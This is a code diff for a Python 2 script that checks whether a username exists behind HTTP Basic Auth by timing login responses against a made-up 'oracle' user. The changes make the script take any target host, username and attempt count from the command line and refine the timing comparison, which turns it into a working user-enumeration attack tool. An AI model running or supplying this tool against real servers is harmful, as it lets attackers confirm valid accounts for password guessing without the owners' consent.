@@ -1,8 +1,8 @@
 #!/usr/bin/python
 import sys
-import timeit
 import numpy
-
+import time
+import requests
 # this script, attempts to use the timing variation in real users and nonuser 
 # inputs to an http basic auth interface.
 
@@ -22,13 +22,22 @@ class bcolors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-
-target="localhost"
-username=sys.argv[1]
-oracle="administrator"
+# usage: ./basicauth.py hostname username attempts
+target=sys.argv[1]
+username=sys.argv[2]
+loops=int(sys.argv[3])
+oracle="garbage"
 password="testa"
 verbose=True
-loops=75
+
+
+def requser(target, targetuser):
+        url= 'http://'+target
+        password="asdfasdf"
+        start=time.time()
+        r = requests.head(url, auth=( targetuser, password ))
+        end=time.time()
+        return (end-start)
 
 def normalize( runs ):
 	elem = numpy.array(runs)
@@ -40,23 +49,20 @@ def normalize( runs ):
 	return normal
 
 def checkuser( oracleuser, targetuser, target, loops ):
-	oraclereq="""import requests
-url = 'http://"""+target+"""'
-r = requests.get(url, auth=('""" + oracleuser + """','password'))"""
-	targetreq="""import requests
-url= 'http://"""+target+"""'
-r = requests.get(url, auth=('""" + targetuser + """','password'))"""
 	oraclerun=[]
 	targetrun=[]
 	for x in range(0,loops):
-		targetrun.append(timeit.timeit(targetreq,number=1))
-		oraclerun.append(timeit.timeit(oraclereq,number=1))
+		targetrun.append(requser(target,targetuser))
+		oraclerun.append(requser(target,oracleuser))
 	targetrun=normalize(targetrun)
 	oraclerun=normalize(oraclerun)
 	if(verbose): sys.stdout.write("ORACLE/TARGET:"+str(numpy.mean(oraclerun))+"/"+str(numpy.mean(targetrun))+"|")
-	return (numpy.mean(oraclerun) <= numpy.mean(targetrun))
+	if (numpy.mean(oraclerun) > numpy.mean(targetrun)):
+		return (False)
+	else:
+		return ( abs(numpy.mean(oraclerun) - numpy.mean(targetrun)) > 0.001 )
 
 if checkuser(oracle, username, target, loops):
-	print bcolors.OKGREEN + username + bcolors.ENDC+" : could exist"
+	print bcolors.OKGREEN + username + " "+ target+" "+bcolors.ENDC+" : could exist"
 else:
-	print bcolors.FAIL + username + bcolors.ENDC+" : doesn't exist"
+	print bcolors.FAIL + username + " "+target+" "+ bcolors.ENDC+" : doesn't exist"
